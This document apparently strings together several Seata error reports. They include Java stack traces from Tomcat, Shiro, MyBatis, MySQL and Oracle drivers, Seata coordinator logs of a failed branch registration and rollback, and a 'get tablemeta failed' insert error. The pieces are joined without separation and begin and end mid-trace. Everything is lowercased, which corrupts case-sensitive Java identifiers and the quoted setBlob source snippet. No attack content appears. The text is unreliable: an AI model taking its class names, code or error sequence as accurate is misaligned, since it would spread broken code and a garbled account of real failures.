javax.servlet.http.httpservlet.service(httpservlet.java:741) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:231) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.apache.tomcat.websocket.server.wsfilter.dofilter(wsfilter.java:53) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.apache.shiro.web.servlet.proxiedfilterchain.dofilter(proxiedfilterchain.java:61) at com.base.core.filter.globalfilter.dofilter(globalfilter.java:53) at org.apache.shiro.web.servlet.proxiedfilterchain.dofilter(proxiedfilterchain.java:66) at org.apache.shiro.web.servlet.abstractshirofilter.executechain(abstractshirofilter.java:449) at org.apache.shiro.web.servlet.abstractshirofilter$1.call(abstractshirofilter.java:365) at org.apache.shiro.subject.support.subjectcallable.docall(subjectcallable.java:90) at org.apache.shiro.subject.support.subjectcallable.call(subjectcallable.java:83) at org.apache.shiro.subject.support.delegatingsubject.execute(delegatingsubject.java:383) at org.apache.shiro.web.servlet.abstractshirofilter.dofilterinternal(abstractshirofilter.java:362) at org.apache.shiro.web.servlet.onceperrequestfilter.dofilter(onceperrequestfilter.java:125) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at com.base.core.filter.csrfilter.dofilter(csrfilter.java:49) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.springframework.web.filter.requestcontextfilter.dofilterinternal(requestcontextfilter.java:99) at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:118) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.springframework.web.filter.formcontentfilter.dofilterinternal(formcontentfilter.java:92) at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:118) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.springframework.web.filter.hiddenhttpmethodfilter.dofilterinternal(hiddenhttpmethodfilter.java:93) at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:118) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.springframework.web.filter.characterencodingfilter.dofilterinternal(characterencodingfilter.java:200) at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:118) at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:202) at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:96) at org.apache.catalina.authenticator.authenticatorbase.invoke(authenticatorbase.java:490) at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:139) at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:92) at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:74) at org.apache.catalina.connector.coyoteadapter.service(coyoteadapter.java:343) at org.apache.coyote.http11.http11processor.service(http11processor.java:408) at org.apache.coyote.abstractprocessorlight.process(abstractprocessorlight.java:66) at org.apache.coyote.abstractprotocol$connectionhandler.process(abstractprotocol.java:853) at org.apache.tomcat.util.net.nioendpoint$socketprocessor.dorun(nioendpoint.java:1587) at org.apache.tomcat.util.net.socketprocessorbase.run(socketprocessorbase.java:49) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at org.apache.tomcat.util.threads.taskthread$wrappingrunnable.run(taskthread.java:61) at java.lang.thread.run(thread.java:748)
caused by: java.sql.sqlexception: invalid argument value: java.io.notserializableexception at com.mysql.cj.jdbc.exceptions.sqlerror.createsqlexception(sqlerror.java:129) at com.mysql.cj.jdbc.exceptions.sqlerror.createsqlexception(sqlerror.java:97) at com.mysql.cj.jdbc.exceptions.sqlerror.createsqlexception(sqlerror.java:89) at com.mysql.cj.jdbc.exceptions.sqlerror.createsqlexception(sqlerror.java:63) at com.mysql.cj.jdbc.exceptions.sqlerror.createsqlexception(sqlerror.java:73) at com.mysql.cj.jdbc.exceptions.sqlexceptionsmapping.translateexception(sqlexceptionsmapping.java:85) at com.mysql.cj.jdbc.clientpreparedstatement.setobject(clientpreparedstatement.java:1664) at com.zaxxer.hikari.pool.hikariproxypreparedstatement.setobject(hikariproxypreparedstatement.java) at io.seata.rm.datasource.exec.basetransactionalexecutor.buildtablerecords(basetransactionalexecutor.java:284) at io.seata.rm.datasource.exec.updateexecutor.beforeimage(updateexecutor.java:63) at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommitfalse(abstractdmlbaseexecutor.java:72) at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.doexecute(abstractdmlbaseexecutor.java:60) at io.seata.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:94) at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:101) at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:47) at io.seata.rm.datasource.preparedstatementproxy.execute(preparedstatementproxy.java:54) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:498) at org.apache.ibatis.logging.jdbc.preparedstatementlogger.invoke(preparedstatementlogger.java:59) at com.sun.proxy.$proxy176.execute(unknown source) at org.apache.ibatis.executor.statement.preparedstatementhandler.update(preparedstatementhandler.java:47) at org.apache.ibatis.executor.statement.routingstatementhandler.update(routingstatementhandler.java:74) at org.apache.ibatis.executor.simpleexecutor.doupdate(simpleexecutor.java:50) at org.apache.ibatis.executor.baseexecutor.update(baseexecutor.java:117) at org.apache.ibatis.executor.cachingexecutor.update(cachingexecutor.java:76) at org.apache.ibatis.session.defaults.defaultsqlsession.update(defaultsqlsession.java:197) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:498) at org.mybatis.spring.sqlsessiontemplate$sqlsessioninterceptor.invoke(sqlsessiontemplate.java:426) ..
caused by: com.mysql.cj.exceptions.wrongargumentexception: invalid argument value: java.io.notserializableexception at sun.reflect.nativeconstructoraccessorimpl.newinstance0(native method) at sun.reflect.nativeconstructoraccessorimpl.newinstance(nativeconstructoraccessorimpl.java:62) at sun.reflect.delegatingconstructoraccessorimpl.newinstance(delegatingconstructoraccessorimpl.java:45) at java.lang.reflect.constructor.newinstance(constructor.java:423) at com.mysql.cj.exceptions.exceptionfactory.createexception(exceptionfactory.java:61) at com.mysql.cj.exceptions.exceptionfactory.createexception(exceptionfactory.java:105) at com.mysql.cj.exceptions.exceptionfactory.createexception(exceptionfactory.java:151) at com.mysql.cj.abstractquerybindings.setserializableobject(abstractquerybindings.java:591) at com.mysql.cj.abstractquerybindings.setobject(abstractquerybindings.java:256) at com.mysql.cj.jdbc.clientpreparedstatement.setobject(clientpreparedstatement.java:1662) ..
caused by: java.io.notserializableexception: io.seata.rm.datasource.sql.struct.null at java.io.objectoutputstream.writeobject0(objectoutputstream.java:1184) at java.io.objectoutputstream.writeobject(objectoutputstream.java:348) at com.mysql.cj.abstractquerybindings.setserializableobject(abstractquerybindings.java:580) ..
javax.sql.rowset.serial.serialexception: invalid arguments: position cannot be less than 1 or greater than the length of the serialblob at javax.sql.rowset.serial.serialblob.getbytes(serialblob.java:178) at com.mysql.cj.clientpreparedquerybindings.setblob(clientpreparedquerybindings.java:183) at com.mysql.cj.jdbc.clientpreparedstatement.setblob(clientpreparedstatement.java:1476) at com.alibaba.druid.filter.filterchainimpl.preparedstatement_setblob(filterchainimpl.java:3450) at com.alibaba.druid.filter.filteradapter.preparedstatement_setblob(filteradapter.java:1162) at com.alibaba.druid.filter.filterchainimpl.preparedstatement_setblob(filterchainimpl.java:3445) at com.alibaba.druid.filter.filteradapter.preparedstatement_setblob(filteradapter.java:1162) at com.alibaba.druid.filter.filterchainimpl.preparedstatement_setblob(filterchainimpl.java:3445) at com.alibaba.druid.proxy.jdbc.preparedstatementproxyimpl.setblob(preparedstatementproxyimpl.java:267) at com.alibaba.druid.pool.druidpooledpreparedstatement.setblob(druidpooledpreparedstatement.java:602) at io.seata.rm.datasource.undo.undologmanager.insertundolog(undologmanager.java:415) at io.seata.rm.datasource.undo.undologmanager.insertundologwithglobalfinished(undologmanager.java:403) at io.seata.rm.datasource.undo.undologmanager.undo(undologmanager.java:237) at io.seata.rm.datasource.datasourcemanager.branchrollback(datasourcemanager.java:185) at io.seata.rm.abstractrmhandler.dobranchrollback(abstractrmhandler.java:124) at io.seata.rm.abstractrmhandler$2.execute(abstractrmhandler.java:68) at io.seata.rm.abstractrmhandler$2.execute(abstractrmhandler.java:64) at io.seata.core.exception.abstractexceptionhandler.exceptionhandletemplate(abstractexceptionhandler.java:117) at io.seata.rm.abstractrmhandler.handle(abstractrmhandler.java:64) at io.seata.rm.defaultrmhandler.handle(defaultrmhandler.java:63) at io.seata.core.protocol.transaction.branchrollbackrequest.handle(branchrollbackrequest.java:35) at io.seata.rm.abstractrmhandler.onrequest(abstractrmhandler.java:149) at io.seata.core.rpc.netty.rmmessagelistener.handlebranchrollback(rmmessagelistener.java:81) at io.seata.core.rpc.netty.rmmessagelistener.onmessage(rmmessagelistener.java:71) at io.seata.core.rpc.netty.abstractrpcremotingclient.dispatch(abstractrpcremotingclient.java:166) at io.seata.core.rpc.netty.abstractrpcremoting$3.run(abstractrpcremoting.java:371) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748)
``` the source code:
clientpreparedquerybindings
``` @override public void setblob(int parameterindex, blob x) { if (x == null) { setnull(parameterindex); } else { try { bytearrayoutputstream bytesout = new bytearrayoutputstream(); bytesout.write('\\''); stringutils.escapeblockfast(x.getbytes(1, (int) x.length()), bytesout, (int) x.length(), this.session.getserversession().useansiquotedidentifiers()); bytesout.write('\\''); setvalue(parameterindex, bytesout.tobytearray(), mysqltype.blob); } catch (throwable t) { throw exceptionfactory.createexception(t.getmessage(), t); } } }
2019-10-29 11:36:08.748 info [batchloggerprint_1]io.seata.core.rpc.defaultservermessagelistenerimpl.run:198 -seatamergemessage timeout=60000,transactionname=projectapproval(java.lang.integer, com.base.business.approval.req.projectapprovalreq)
,clientip:172.16.2.234,vgroup:tx_group
2019-10-29 11:36:08.752 info [serverhandlerthread_17_500]io.seata.server.coordinator.defaultcore.begin:145 -successfully begin global transaction xid = 172.16.2.80:8091:2025809160
2019-10-29 11:36:08.770 info [batchloggerprint_1]io.seata.core.rpc.defaultservermessagelistenerimpl.run:198 -seatamergemessage xid=172.16.2.80:8091:2025809160,branchtype=at,resourceid=jdbc:mysql://172.16.2.80:3306/business,lockkey=t_project_info:30
,clientip:172.16.2.234,vgroup:tx_group
2019-10-29 11:36:08.779 info [serverhandlerthread_18_500]io.seata.server.coordinator.defaultcore.lambda$branchregister$0:94 -successfully register branch xid = 172.16.2.80:8091:2025809160, branchid = 2025809162
2019-10-29 11:36:08.785 info [batchloggerprint_1]io.seata.core.rpc.defaultservermessagelistenerimpl.run:198 -seatamergemessage xid=172.16.2.80:8091:2025809160,branchid=2025809162,resourceid=null,status=phaseone_done,applicationdata=null
,clientip:172.16.2.234,vgroup:tx_group
2019-10-29 11:36:08.790 info [serverhandlerthread_19_500]io.seata.server.coordinator.defaultcore.branchreport:118 -successfully branch report xid = 172.16.2.80:8091:2025809160, branchid = 2025809162
2019-10-29 11:36:08.801 info [batchloggerprint_1]io.seata.core.rpc.defaultservermessagelistenerimpl.run:198 -seatamergemessage xid=172.16.2.80:8091:2025809160,branchtype=at,resourceid=jdbc:mysql://172.16.2.80:3306/business,lockkey=t_project_approval_temp:66
,clientip:172.16.2.234,vgroup:tx_group
2019-10-29 11:36:08.811 info [serverhandlerthread_20_500]io.seata.server.coordinator.defaultcore.lambda$branchregister$0:94 -successfully register branch xid = 172.16.2.80:8091:2025809160, branchid = 2025809165
2019-10-29 11:36:08.817 info [batchloggerprint_1]io.seata.core.rpc.defaultservermessagelistenerimpl.run:198 -seatamergemessage xid=172.16.2.80:8091:2025809160,branchid=2025809165,resourceid=null,status=phaseone_done,applicationdata=null
,clientip:172.16.2.234,vgroup:tx_group
2019-10-29 11:36:08.823 info [serverhandlerthread_21_500]io.seata.server.coordinator.defaultcore.branchreport:118 -successfully branch report xid = 172.16.2.80:8091:2025809160, branchid = 2025809165
2019-10-29 11:36:08.890 info [batchloggerprint_1]io.seata.core.rpc.defaultservermessagelistenerimpl.run:198 -seatamergemessage xid=172.16.2.80:8091:2025809160,branchtype=at,resourceid=jdbc:mysql://172.16.2.80:3306/workflow,lockkey=t_task_history:9;t_task_history:8;t_process_instance_task:12,13,15,16,17;t_process_instance_task:17;t_task_history:7;t_task_history:6;t_task_history:10;t_process_instance:72
,clientip:172.16.2.234,vgroup:workflow_tx_group
2019-10-29 11:36:08.918 error[serverhandlerthread_22_500]io.seata.core.exception.abstractexceptionhandler.exceptionhandletemplate:120 -catch transactionexception while do rpc, request: xid=172.16.2.80:8091:2025809160,branchtype=at,resourceid=jdbc:mysql://172.16.2.80:3306/workflow,lockkey=t_task_history:9;t_task_history:8;t_process_instance_task:12,13,15,16,17;t_process_instance_task:17;t_task_history:7;t_task_history:6;t_task_history:10;t_process_instance:72
io.seata.core.exception.transactionexception: branch register request failed
xid=172.16.2.80:8091:2025809160, msg=duplicate entry 'jdbc:mysql://172.16.2.80:3306/workflow^^^t_process_instance_task' for key 'primary' at io.seata.server.abstracttcinboundhandler$4.execute(abstracttcinboundhandler.java:174) at io.seata.server.abstracttcinboundhandler$4.execute(abstracttcinboundhandler.java:166) at io.seata.core.exception.abstractexceptionhandler.exceptionhandletemplate(abstractexceptionhandler.java:117) at io.seata.server.abstracttcinboundhandler.handle(abstracttcinboundhandler.java:166) at io.seata.core.protocol.transaction.branchregisterrequest.handle(branchregisterrequest.java:136) at io.seata.server.coordinator.defaultcoordinator.onrequest(defaultcoordinator.java:533) at io.seata.core.rpc.defaultservermessagelistenerimpl.ontrxmessage(defaultservermessagelistenerimpl.java:89) at io.seata.core.rpc.netty.rpcserver.dispatch(rpcserver.java:299) at io.seata.core.rpc.netty.abstractrpcremoting$3.run(abstractrpcremoting.java:371) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748)
2019-10-29 11:36:08.920 info [batchloggerprint_1]io.seata.core.rpc.defaultservermessagelistenerimpl.run:198 -seatamergemessage xid=172.16.2.80:8091:2025809160,branchtype=at,resourceid=jdbc:mysql://172.16.2.80:3306/workflow,lockkey=t_task_history:9;t_task_history:8;t_process_instance_task:12,13,15,16,17;t_process_instance_task:17;t_task_history:7;t_task_history:6;t_task_history:10;t_process_instance:72
,clientip:172.16.2.234,vgroup:workflow_tx_group
2019-10-29 11:36:08.930 error[serverhandlerthread_23_500]io.seata.core.exception.abstractexceptionhandler.exceptionhandletemplate:120 -catch transactionexception while do rpc, request: xid=172.16.2.80:8091:2025809160,branchtype=at,resourceid=jdbc:mysql://172.16.2.80:3306/workflow,lockkey=t_task_history:9;t_task_history:8;t_process_instance_task:12,13,15,16,17;t_process_instance_task:17;t_task_history:7;t_task_history:6;t_task_history:10;t_process_instance:72
io.seata.core.exception.branchtransactionexception: failed to store branch xid = 172.16.2.80:8091:2025809160 branchid = 2025809170 at io.seata.server.coordinator.defaultcore.lambda$branchregister$0(defaultcore.java:92) at io.seata.server.session.globalsession.lockandexcute(globalsession.java:597) at io.seata.server.coordinator.defaultcore.branchregister(defaultcore.java:70) at io.seata.server.coordinator.defaultcoordinator.dobranchregister(defaultcoordinator.java:201) at io.seata.server.abstracttcinboundhandler$4.execute(abstracttcinboundhandler.java:171) at io.seata.server.abstracttcinboundhandler$4.execute(abstracttcinboundhandler.java:166) at io.seata.core.exception.abstractexceptionhandler.exceptionhandletemplate(abstractexceptionhandler.java:117) at io.seata.server.abstracttcinboundhandler.handle(abstracttcinboundhandler.java:166) at io.seata.core.protocol.transaction.branchregisterrequest.handle(branchregisterrequest.java:136) at io.seata.server.coordinator.defaultcoordinator.onrequest(defaultcoordinator.java:533) at io.seata.core.rpc.defaultservermessagelistenerimpl.ontrxmessage(defaultservermessagelistenerimpl.java:89) at io.seata.core.rpc.netty.rpcserver.dispatch(rpcserver.java:299) at io.seata.core.rpc.netty.abstractrpcremoting$3.run(abstractrpcremoting.java:371) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:748)
2019-10-29 11:36:08.935 info [batchloggerprint_1]io.seata.core.rpc.defaultservermessagelistenerimpl.run:198 -seatamergemessage xid=172.16.2.80:8091:2025809160,extradata=null
,clientip:172.16.2.234,vgroup:tx_group
2019-10-29 11:36:08.953 info [serverhandlerthread_24_500]io.seata.server.coordinator.defaultcore.doglobalrollback:405 -successfully rollback branch xid=172.16.2.80:8091:2025809160 branchid=2025809165
2019-10-29 11:36:08.967 info [serverhandlerthread_24_500]io.seata.server.coordinator.defaultcore.doglobalrollback:405 -successfully rollback branch xid=172.16.2.80:8091:2025809160 branchid=2025809162
2019-10-29 11:36:08.972 info [serverhandlerthread_24_500]io.seata.server.coordinator.defaultcore.doglobalrollback:437 -successfully rollback global, xid = 172.16.2.80:8091:2025809160
caused by: java.sql.sqlexception: at oracle.jdbc.driver.sqlstatemapping.newsqlexception(sqlstatemapping.java:70) at oracle.jdbc.driver.databaseerror.newsqlexception(databaseerror.java:112) at oracle.jdbc.driver.databaseerror.throwsqlexception(databaseerror.java:173) at oracle.jdbc.driver.databaseerror.throwsqlexception(databaseerror.java:229) at oracle.jdbc.driver.databaseerror.throwsqlexception(databaseerror.java:403) at oracle.jdbc.driver.physicalconnection.releasesavepoint(physicalconnection.java:5605) at com.alibaba.druid.filter.filterchainimpl.connection_releasesavepoint(filterchainimpl.java:702) at com.alibaba.druid.filter.filteradapter.connection_releasesavepoint(filteradapter.java:968) at com.alibaba.druid.filter.filterchainimpl.connection_releasesavepoint(filterchainimpl.java:697) at com.alibaba.druid.proxy.jdbc.connectionproxyimpl.releasesavepoint(connectionproxyimpl.java:393) at com.alibaba.druid.pool.druidpooledconnection.releasesavepoint(druidpooledconnection.java:836) at io.seata.rm.datasource.exec.selectforupdateexecutor.doexecute(selectforupdateexecutor.java:99) at io.seata.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:94) at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:101) at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:47) at io.seata.rm.datasource.preparedstatementproxy.executequery(preparedstatementproxy.java:64) at org.springframework.jdbc.core.jdbctemplate$1.doinpreparedstatement(jdbctemplate.java:665) at org.springframework.jdbc.core.jdbctemplate.execute(jdbctemplate.java:604) ..
![1571048449(1)](
### error updating database
cause: java.sql.sqlexception: io.seata.common.exception.shouldneverhappenexception: [xid:10.20.29.45:8091:2024776247]get tablemeta failed
### the error may exist in com/warape/seatorder/mapper/ordermapper.java (best guess)
### the error may involve com.warape.seatorder.mapper.ordermapper.insert-inline
### the error occurred while setting parameters
### sql: insert into `order` ( user_id, product_id, count, money ) values ( ?, ?, ?, ? )
### cause: java.sql.sqlexception: io.seata.common.exception.shouldneverhappenexception: [xid:10.20.29.45:8091:2024776247]get tablemeta failed
; uncategorized sqlexception; sql state [null]; error code [0]; io.seata.common.exception.shouldneverhappenexception: [xid:10.20.29.45:8091:2024776247]get tablemeta failed; nested exception is java.sql.sqlexception: io.seata.common.exception.shouldneverhappenexception: [xid:10.20.29.45:8091:2024776247]get tablemeta failed] with root cause io.seata.common.exception.shouldneverhappenexception: [xid:10.20.29.45:8091:2024776247]get tablemeta failed at io.seata.rm.datasource.sql.struct.tablemetacache.gettablemeta(tablemetacache.java:91) ~[seata-all-0.8.1.jar:0.8.1] at io.seata.rm.datasource.exec.basetransactionalexecutor.gettablemeta(basetransactionalexecutor.java:194) ~[seata-all-0.8.1.jar:0.8.1] at io.seata.rm.datasource.exec.basetransactionalexecutor.gettablemeta(basetransactionalexecutor.java:178) ~[seata-all-0.8.1.jar:0.8.1] at io.seata.rm.datasource.exec.insertexecutor.beforeimage(insertexecutor.java:70) ~[seata-all-0.8.1.jar:0.8.1] at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommitfalse(abstractdmlbaseexecutor.java:72) ~[seata-all-0.8.1.jar:0.8.1] at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.lambda$executeautocommittrue$0(abstractdmlbaseexecutor.java:91) ~[seata-all-0.8.1.jar:0.8.1] at io.seata.rm.datasource.connectionproxy$lockretrypolicy.doretryonlockconflict(connectionproxy.java:290) ~[seata-all-0.8.1.jar:0.8.1] at io.seata.rm.datasource.exec.abstractdmlbaseexecutor$lockretrypolicy.execute(abstractdmlbaseexecutor.java:135) ~[seata-all-0.8.1.jar:0.8.1] at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommittrue(abstractdmlbaseexecutor.java:90) ~[seata-all-0.8.1.jar:0.8.1] at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.doexecute(abstractdmlbaseexecutor.java:58) ~[seata-all-0.8.1.jar:0.8.1] at io.seata.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:96) ~[seata-all-0.8.1.jar:0.8.1] at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:101) ~[seata-all-0.8.1.jar:0.8.1] at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:47) ~[seata-all-0.8.1.jar:0.8.1] at io.seata.rm.datasource.preparedstatementproxy.execute(preparedstatementproxy.java:54) ~[seata-all-0.8.1.jar:0.8.1] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_211] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_211] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_211] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_211] at org.apache.ibatis.logging.jdbc.preparedstatementlogger.invoke(preparedstatementlogger.java:59) ~[mybatis-3.5.1.jar:3.5.1] at com.sun.proxy.$proxy125.execute(unknown source) ~[na:na] at org.apache.ibatis.executor.statement.preparedstatementhandler.update(preparedstatementhandler.java:47) ~[mybatis-3.5.1.jar:3.5.1] at org.apache.ibatis.executor.statement.routingstatementhandler.update(routingstatementhandler.java:74) ~[mybatis-3.5.1.jar:3.5.1] at com.baomidou.mybatisplus.core.executor.mybatissimpleexecutor.doupdate(mybatissimpleexecutor.java:54) ~[mybatis-plus-core-3.1.2.jar:3.1.2] at org.apache.ibatis.executor.baseexecutor.update(baseexecutor.java:117) ~[mybatis-3.5.1.jar:3.5.1] at org.apache.ibatis.executor.cachingexecutor.update(cachingexecutor.java:76) ~[mybatis-3.5.1.jar:3.5.1] at org.apache.ibatis.session.defaults.defaultsqlsession.update(defaultsqlsession.java:197) ~[mybatis-3.5.1.jar:3.5.1] at org.apache.ibatis.session.defaults.defaultsqlsession.insert(defaultsqlsession.java:184) ~[mybatis-3.5.1.jar:3.5.1] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_211] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_211] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_211] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_211] at org.mybatis.spring.sqlsessiontemplate$sqlsessioninterceptor.invoke(sqlsessiontemplate.java:433) ~[mybatis-spring-2.0.1.jar:2.0.1] at com.sun.proxy.$proxy105.insert(unknown source) ~[na:na] at org.mybatis.spring.sqlsessiontemplate.insert(sqlsessiontemplate.java:278) ~[mybatis-spring-2.0.1.jar:2.0.1] at com.baomidou.mybatisplus.core.override.mybatismappermethod.execute(mybatismappermethod.java:58) ~[mybatis-plus-core-3.1.2.jar:3.1.2] at com.baomidou.mybatisplus.core.override.mybatismapperproxy.invoke(mybatismapperproxy.java:62) ~[mybatis-plus-core-3.1.2.jar:3.1.2] at com.sun.proxy.$proxy107.insert(unknown source) ~[na:na] at com.warape.seatorder.service.impl.orderserviceimpl.create(orderserviceimpl.java:43) ~[classes/:na] at com.warape.seatorder.service.impl.orderserviceimpl$$fastclassbyspringcglib$$54cb3784.invoke(<generated>) ~[classes/:na] at org.springframework.cglib.proxy.methodproxy.invoke(methodproxy.java:218) ~[spring-core-5.1.9.release.jar:5.1.9.release] at org.springframework.aop.framework.cglibaopproxy$cglibmethodinvocation.invokejoinpoint(cglibaopproxy.java:749) ~[spring-aop-5.1.9.release.jar:5.1.9.release] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:163) ~[spring-aop-5.1.9.release.jar:5.1.9.release] at io.seata.spring.annotation.globaltransactionalinterceptor$1.execute(globaltransactionalinterceptor.java:104) ~[seata-all-0.8.1.jar:0.8.1] at io.seata.tm.api.transactionaltemplate.execute(transactionaltemplate.java:64) ~[seata-all-0.8.1.jar:0.8.1] at io.seata.spring.annotation.globaltransactionalinterceptor.handleglobaltransaction(globaltransactionalinterceptor.java:101) ~[seata-all-0.8.1.jar:0.8.1] at io.seata.spring.annotation.globaltransactionalinterceptor.invoke(globaltransactionalinterceptor.java:76) ~[seata-all-0.8.1.jar:0.8.1] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:186) ~[spring-aop-5.1.9.release.jar:5.1.9.release] at org.springframework.aop.framework.cglibaopproxy$dynamicadvisedinterceptor.intercept(cglibaopproxy.java:688) ~[spring-aop-5.1.9.release.jar:5.1.9.release] at com.warape.seatorder.service.impl.orderserviceimpl$$enhancerbyspringcglib$$eae2ba37.create(<generated>) ~[classes/:na] at com.warape.seatorder.controller.ordercontroller.create(ordercontroller.java:27) ~[classes/:na] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_211] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_211] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_211] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_211] at org.springframework.web.method.support.invocablehandlermethod.doinvoke(invocablehandlermethod.java:190) ~[spring-web-5.1.9.release.jar:5.1.9.release] at org.springframework.web.method.support.invocablehandlermethod.invokeforrequest(invocablehandlermethod.java:138) ~[spring-web-5.1.9.release.jar:5.1.9.release] at org.springframework.web.servlet.mvc.method.annotation.servletinvocablehandlermethod.invokeandhandle(servletinvocablehandlermethod.java:104) ~[spring-webmvc-5.1.9.release.jar:5.1.9.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.invokehandlermethod(requestmappinghandleradapter.java:892) ~[spring-webmvc-5.1.9.release.jar:5.1.9.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.handleinternal(requestmappinghandleradapter.java:797) ~[spring-webmvc-5.1.9.release.jar:5.1.9.release] at org.springframework.web.servlet.mvc.method.abstracthandlermethodadapter.handle(abstracthandlermethodadapter.java:87) ~[spring-webmvc-5.1.9.release.jar:5.1.9.release] at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:1039) ~[spring-webmvc-5.1.9.release.jar:5.1.9.release] at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:942) ~[spring-webmvc-5.1.9.release.jar:5.1.9.release] at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:1005) ~[spring-webmvc-5.1.9.release.jar:5.1.9.release] at org.springframework.web.servlet.frameworkservlet.doget(frameworkservlet.java:897) ~[spring-webmvc-5.1.9.release.jar:5.1.9.release] at javax.servlet.http.httpservlet.service(httpservlet.java:634) ~[tomcat-embed-core-9.0.24.jar:9.0.24] at org.springframework.web.servlet.frameworkservlet.service(frameworkservlet.java:882) ~[spring-webmvc-5.1.9.release.jar:5.1.9.release] at javax.servlet.http.httpservlet.service(httpservlet.java:741) ~[tomcat-embed-core-9.0.24.jar:9.0.24] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:231) ~[tomcat-embed-core-9.0.24.jar:9.0.24] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) 